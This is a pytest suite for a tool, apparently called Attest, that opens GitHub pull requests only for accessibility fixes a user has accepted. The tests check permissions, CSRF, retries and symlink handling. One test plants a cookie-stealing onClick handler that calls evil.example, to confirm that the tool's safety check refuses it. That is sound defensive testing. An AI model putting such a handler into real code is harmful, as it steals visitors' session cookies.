"""Opening pull requests on a person's own repository, through the GitHub API only, for exactly the fixes they accepted."""

import asyncio

import pytest
from sqlalchemy import select
from test_accounts import H, browser, sign_in

from auditor.models import Finding, FindingStatus, FixAttempt

pytestmark = pytest.mark.timeout(600)


async def audited(world, c, **attach):
    await sign_in(c, "alice")
    p = await world.attach(c, allow_pr=True, **attach)
    rid, d = await world.run(c)
    assert d["run"]["status"] == "complete"
    rows = {r["rule_id"]: r for r in (await c.get(f"/api/runs/{rid}/pull-requests")).json()["rows"]}
    return p, rid, rows


async def decide(c, rows, **actions):
    for rule, action in actions.items():
        assert (await c.post(f"/api/findings/{rows[rule]['finding_id']}/decision", headers=H, json={"action": action})).status_code == 201


async def test_only_the_accepted_fix_becomes_a_pull_request(world, sf):
    repo_name = "alice/web"
    async with browser(world.app) as c:
        p, rid, rows = await audited(world, c)
        assert set(rows) == {"label", "html-has-lang"} and all(r["proof"] == "not_retested" for r in rows.values())
        await decide(c, rows, label="accept_pr", **{"html-has-lang": "reject_pr"})
        assert (await c.get(f"/api/runs/{rid}/pull-requests")).json()["publishable"] == 1

        r = await c.post(f"/api/runs/{rid}/publish", headers=H)
        assert r.status_code == 200, r.text
        out = r.json()
        assert len(out["opened"]) == 1 and out["opened"][0]["fixes"] == 1 and out["errors"] == []
        pr = out["opened"][0]
        assert pr["url"] == f"https://github.com/{repo_name}/pull/1" and pr["branch"].startswith(f"attest/{rid[:8]}-")

        # what actually landed in the repository
        git = world.gh.repos[repo_name]["obj"]
        assert git.changed_paths(pr["branch"]) == ["src/App.jsx"], "only the accepted fix's file changed"
        mode, text = git.read(pr["branch"], "src/App.jsx")
        assert mode == "100644" and ("htmlFor" in text or "aria-label" in text)
        assert git.read(pr["branch"], "index.html") == git.read("main", "index.html"), "the rejected fix is not on the branch"
        commits = [o for o in git.objects.values() if o["type"] == "commit" and o["message"].startswith("a11y:")]
        assert [c_["message"].split(" (")[0] for c_ in commits] == ["a11y: fix label"]
        assert git.refs["refs/heads/main"] == "a" * 40, "the default branch is untouched: Attest never merges"
        (gh_pr,) = git.pulls
        assert gh_pr["base"]["ref"] == "main" and gh_pr["head"]["ref"] == pr["branch"]
        assert "have not been tested yet" in gh_pr["body"] and "does not establish" in gh_pr["body"]
        for banned in ("compliant", "certified", "conforms"):
            assert banned not in (gh_pr["title"] + gh_pr["body"]).lower()

        # Attest's view afterwards
        after = {r["rule_id"]: r for r in (await c.get(f"/api/runs/{rid}/pull-requests")).json()["rows"]}
        assert (after["label"]["remote"], after["label"]["pr_number"]) == ("open", 1) and after["html-has-lang"]["remote"] == "server_only"
        assert (await c.get(f"/api/findings/{rows['label']['finding_id']}")).json()["status"] == "pr_open"
        assert (await c.post(f"/api/runs/{rid}/publish", headers=H)).status_code == 409  # nothing left to publish
        assert len(git.pulls) == 1, "no duplicate pull request"

        # accepting the other one later opens its own pull request; the first is untouched
        await decide(c, rows, **{"html-has-lang": "accept_pr"})
        out2 = (await c.post(f"/api/runs/{rid}/publish", headers=H)).json()
        assert len(out2["opened"]) == 1 and out2["opened"][0]["url"].endswith("/pull/2") and out2["opened"][0]["branch"] != pr["branch"]
        assert git.changed_paths(out2["opened"][0]["branch"]) == ["index.html"]
    with sf() as db:
        assert {f.rule_id: f.status for f in db.scalars(select(Finding))}["label"] == FindingStatus.pr_open


async def test_nothing_is_written_unless_the_project_allows_pull_requests(world):
    async with browser(world.app) as c:
        await sign_in(c, "alice")
        await world.attach(c)  # allow_pr stays off
        rid, _ = await world.run(c)
        rows = {r["rule_id"]: r for r in (await c.get(f"/api/runs/{rid}/pull-requests")).json()["rows"]}
        await decide(c, rows, label="accept_pr")
        r = await c.post(f"/api/runs/{rid}/publish", headers=H)
        assert r.status_code == 403 and "switched off" in r.json()["detail"]
        git = world.gh.repos["alice/web"].get("obj")  # created lazily: it may never have been touched
        assert git is None or (git.pulls == [] and list(git.refs) == ["refs/heads/main"])
        project_id = (await c.get("/api/projects")).json()[0]["id"]
        assert (await c.patch(f"/api/projects/{project_id}", headers=H, json={"allow_pr": True})).status_code == 200
        assert (await c.post(f"/api/runs/{rid}/publish", headers=H)).status_code == 200  # and it works once the owner opts in


async def test_a_missing_decision_or_the_wrong_person_publishes_nothing(world):
    async with browser(world.app) as alice, browser(world.app) as bob:
        await sign_in(bob, "bob")
        _, rid, rows = await audited(world, alice)
        assert (await alice.post(f"/api/runs/{rid}/publish", headers=H)).status_code == 409  # nothing accepted yet
        await decide(alice, rows, label="accept_pr")
        assert (await bob.post(f"/api/runs/{rid}/publish", headers=H)).status_code == 404  # not bob's run
        assert (await alice.post(f"/api/runs/{rid}/publish")).status_code == 403  # no CSRF header
        git = world.gh.repos["alice/web"]["obj"]
        assert git.pulls == [] and list(git.refs) == ["refs/heads/main"]


async def test_a_permissions_problem_is_explained_and_changes_nothing(world, sf):
    async with browser(world.app) as c:
        _, rid, rows = await audited(world, c)
        await decide(c, rows, label="accept_pr")
        world.gh.repo_obj("alice/web").writable = False  # the owner installed the app read-only
        r = await c.post(f"/api/runs/{rid}/publish", headers=H)
        assert r.status_code == 502 and "not allowed to do that" in r.json()["detail"] and "permissions" in r.json()["detail"]
    with sf() as db:
        assert all(a.pr_url is None and a.status != "pr_open" for a in db.scalars(select(FixAttempt)))


async def test_a_failure_after_the_branch_exists_is_resumed_not_duplicated(world):
    async with browser(world.app) as c:
        _, rid, rows = await audited(world, c)
        await decide(c, rows, label="accept_pr")
        git = world.gh.repo_obj("alice/web")
        git.fail_pulls = 1  # GitHub hiccups when the pull request is opened
        assert (await c.post(f"/api/runs/{rid}/publish", headers=H)).status_code == 502
        branches = [r for r in git.refs if r.startswith("refs/heads/attest/")]
        assert len(branches) == 1 and git.pulls == []
        r = await c.post(f"/api/runs/{rid}/publish", headers=H)
        assert r.status_code == 200 and len(git.pulls) == 1
        assert [r_ for r_ in git.refs if r_.startswith("refs/heads/attest/")] == branches, "the branch was reused, not recreated"
        assert len([o for o in git.objects.values() if o["type"] == "commit" and o["message"].startswith("a11y:")]) == 1


async def test_two_clicks_at_once_open_one_pull_request(world):
    async with browser(world.app) as c:
        _, rid, rows = await audited(world, c)
        await decide(c, rows, label="accept_pr")
        a, b = await asyncio.gather(c.post(f"/api/runs/{rid}/publish", headers=H), c.post(f"/api/runs/{rid}/publish", headers=H))
        assert sorted([a.status_code, b.status_code]) in ([200, 409],), (a.text, b.text)
        assert len(world.gh.repos["alice/web"]["obj"].pulls) == 1


async def test_file_modes_are_kept_and_links_are_never_overwritten(world):
    async with browser(world.app) as c:
        await sign_in(c, "alice")
        world.gh.repos["alice/web"]["modes"] = {"src/App.jsx": "100755"}
        await world.attach(c, allow_pr=True)
        rid, _ = await world.run(c)
        rows = {r["rule_id"]: r for r in (await c.get(f"/api/runs/{rid}/pull-requests")).json()["rows"]}
        await decide(c, rows, label="accept_pr")
        out = (await c.post(f"/api/runs/{rid}/publish", headers=H)).json()
        assert world.gh.repos["alice/web"]["obj"].read(out["opened"][0]["branch"], "src/App.jsx")[0] == "100755"  # still executable

    # a path that is a symlink in the repository must never be written through
    async with browser(world.app) as c:
        await sign_in(c, "bob")
        world.gh.repos["bob/web"]["modes"] = {"src/App.jsx": "120000"}
        p = await world.attach(c, "bob", allow_pr=True)
        rid, _ = await world.run(c)
        rows = {r["rule_id"]: r for r in (await c.get(f"/api/runs/{rid}/pull-requests")).json()["rows"]}
        await decide(c, rows, label="accept_pr")
        r = await c.post(f"/api/runs/{rid}/publish", headers=H)
        assert r.status_code == 502 and "link or special entry" in r.json()["detail"]
        assert world.gh.repos["bob/web"]["obj"].pulls == [] and p["id"]


async def test_an_edit_that_no_longer_passes_the_safety_policy_is_not_published(world, sf):
    """Edits are re-checked at the last step. One altered after it was authored (or by a bug) is refused, not shipped."""
    async with browser(world.app) as c:
        _, rid, rows = await audited(world, c)
        await decide(c, rows, label="accept_pr", **{"html-has-lang": "accept_pr"})
        with sf() as db:
            fa = db.scalar(select(FixAttempt).where(FixAttempt.finding_id == rows["label"]["finding_id"]))
            e = dict(fa.edits[0])
            e["replacement"] = e["replacement"].replace("/>", "onClick={() => fetch('https://evil.example/' + document.cookie)} />")
            fa.edits = [e]
            db.commit()
        out = (await c.post(f"/api/runs/{rid}/publish", headers=H)).json()
        assert any("label" in err and "unsafe edit rejected" in err for err in out["errors"]), out
        git = world.gh.repos["alice/web"]["obj"]
        for ref in git.refs:
            b = ref.removeprefix("refs/heads/")
            assert "evil.example" not in git.read(b, "src/App.jsx")[1], "the unsafe edit reached the repository"
        assert [p["head"]["ref"] for p in git.pulls] and git.changed_paths(git.pulls[0]["head"]["ref"]) == ["index.html"]  # the safe one still went
